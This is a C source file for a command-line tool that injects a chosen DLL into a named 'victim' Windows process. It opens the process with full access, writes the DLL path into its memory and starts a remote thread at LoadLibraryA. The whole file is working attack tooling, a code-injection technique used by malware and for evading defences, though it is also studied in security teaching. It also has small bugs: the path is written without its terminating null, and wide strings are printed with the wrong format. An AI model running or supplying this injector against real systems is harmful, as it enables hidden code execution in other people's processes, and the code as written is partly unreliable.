/*
* Basic Windows DLL injection using CreateRemoteThread and LoadLibrary
* Written by Brandon Arvanaghi (@arvanaghi)
* Many functions and comments taken from https://msdn.microsoft.com/en-us/library/windows/desktop/hh920508(v=vs.85).aspx
*/

#include "stdio.h"
#include "Windows.h"
#include "tlhelp32.h"
#include "tchar.h"
#include "wchar.h"

//  Forward declarations
HANDLE findProcess(WCHAR* processName);
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath);
void printError(TCHAR* msg);

// Main
int wmain(int argc, wchar_t *argv[]) {
	// Convert executable name back to char* from wchar*
	const char dllPath[MAX_PATH];
	wcstombs(dllPath, argv[2], MAX_PATH);

	// wprint to print WCHAR strings
	wprintf(L"Victim process name	: %s\n", argv[1]);
	wprintf(L"DLL to inject		: %s\n", argv[2]);

	HANDLE hProcess = findProcess(argv[1]);
	if (hProcess != NULL) {
		BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
		if (injectSuccessful) {
			printf("[+] DLL injection successful! \n");
			getchar();
		} else {
			printf("[---] DLL injection failed. \n");
			getchar();
		}
	}

}

/* Look for the process in memory
* Walks through snapshot of processes in memory, compares with command line argument
* Modified from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
*/
HANDLE findProcess(WCHAR* processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("[---] Could not create snapshot.\n");
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		printError(TEXT("Process32First"));
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {

		if (!wcscmp(pe32.szExeFile, processName)) {
			wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);

			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				return hProcess;
			} else {
				printf("[---] Failed to open process %s.\n", pe32.szExeFile);
				return NULL;

			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	printf("[---] %s has not been loaded into memory, aborting.\n", processName);
	return NULL;
}

/* Load DLL into remote process
* Gets LoadLibraryA address from current process, which is guaranteed to be same for single boot session across processes
* Allocated memory in remote process for DLL path name
* CreateRemoteThread to run LoadLibraryA in remote process. Address of DLL path in remote memory as argument
*/
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {
	printf("Enter any key to attempt DLL injection.");
	getchar();

	// Allocate memory for DLL's path name to remote process
	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		printf("[---] VirtualAllocEx unsuccessful.\n");
		printError(TEXT("VirtualAllocEx"));
		getchar();
		return FALSE;
	}

	// Write DLL's path name to remote process
	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

	if (!succeededWriting) {
		printf("[---] WriteProcessMemory unsuccessful.\n");
		printError(TEXT("WriteProcessMemory"));
		getchar();
		return FALSE;
	} else {
		// Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
		LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddress == NULL) {
			printf("[---] LoadLibrary not found in process.\n");
			printError(TEXT("GetProcAddress"));
			getchar();
			return FALSE;
		} else {
			HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
			if (remoteThread == NULL) {
				printf("[---] CreateRemoteThread unsuccessful.\n");
				printError(TEXT("CreateRemoteThread"));
				return FALSE;
			}
		}
	}

	CloseHandle(hProcess);
	return TRUE;
}

/* Prints error message
* Taken from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
*/
void printError(TCHAR* msg) {
	DWORD eNum;
	TCHAR sysMsg[256];
	TCHAR* p;

	eNum = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, eNum,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		sysMsg, 256, NULL);

	// Trim the end of the line and terminate it with a null
	p = sysMsg;
	while ((*p > 31) || (*p == 9))
		++p;
	do { *p-- = 0; } while ((p >= sysMsg) &&
		((*p == '.') || (*p < 33)));

	// Display the message
	printf("[---] %s failed with error %d (%s) \n", msg, eNum, sysMsg);
}
